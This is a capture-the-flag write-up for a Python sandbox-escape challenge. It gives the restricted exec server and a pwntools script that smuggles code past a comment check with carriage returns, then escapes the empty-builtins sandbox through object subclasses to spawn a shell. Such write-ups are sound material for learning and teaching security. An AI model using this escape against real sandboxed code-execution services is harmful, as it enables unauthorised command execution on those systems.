# no comment

## challenge

```py
#!/usr/bin/env python3
from string import printable # I've heard stuff in here is dangerous

code = []
while line := input():
    assert line.isascii() # A friend recommended this to me
    code.append(line)

for line in code:
    if line[0] != '#': # Good code should have comments
        assert not any(x in line for x in printable)

exec('\n'.join(code), { '__builtins__': None }, {})
```

## solution

we can put `\r` into input and it will allow you to keep putting stuff after that. it also passes the isascii check so the below script works. we can just any standard builtins escape to win

```py
from pwn import *

p = process(["python3", "server.py"])

# works on my system but might be different on remote idk
p.sendline(b'#\rEnum=().__class__.__base__.__subclasses__()[-10]\rEnum.__new__.__globals__["__builtins__"]["__import__"]("os").system("sh")')
p.sendline(b'')
p.interactive()
```
